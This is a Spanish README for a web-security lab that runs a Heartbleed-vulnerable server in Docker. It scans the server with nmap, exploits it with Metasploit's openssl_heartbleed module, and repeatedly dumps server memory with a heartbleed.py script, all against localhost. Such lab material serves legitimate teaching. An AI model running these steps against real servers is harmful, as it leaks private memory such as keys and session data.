# Seguridad de Aplicaciones Web

## Pasos para levantar el entorno de pruebas

Construir la imagen en Docker:

```bash	
docker build -t heartbleed-image-websegapp .
```

Crear un contenedor en base a la imagen abriendo los puertos y exponiendo los volumenes internos:

```bash
docker run -p 8080:8080 -p 443:443 --name heartbleed-server -d -it heartbleed-image-websegapp java -Dserver.port=$PORT $JAVA_OPTS -jar target/que-me-pongo-0.0.1-SNAPSHOT.jar
```

## Verificar si el servidor es vulnerable 

Con NMAP:

```bash
nmap -sV –script=ssl-heartbleed
```

Con MSF:
```bash
msfconsole
```

Usamos el plugin para explotar la vulnerabilidad:
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
```

Establecer el servidor victima y ponemos en modo dump el plugin:

```bash
set RHOSTS localhost
set verbose true
```

Explotamos la vulnerabilidad:

```bash
exploit
```

## Hacer dump de la memoria del servidor HTTP vulnerable:

Requisito: tener instalado python 2.7

Creamos el archivo donde vamos a hacer dump del servidor y vemos que va pasando en vivo:

```bash
truncate -s0 /tmp/heartbleed.out && tail -f /tmp/heartbleed.out
```

Ejecutamos el exploit cada un segundo y volcamos el contenido:

```bash
while true; do python heartbleed.py localhost >> /tmp/heartbleed.out; sleep 1; done
```

## License
[MIT](https://choosealicense.com/licenses/mit/)

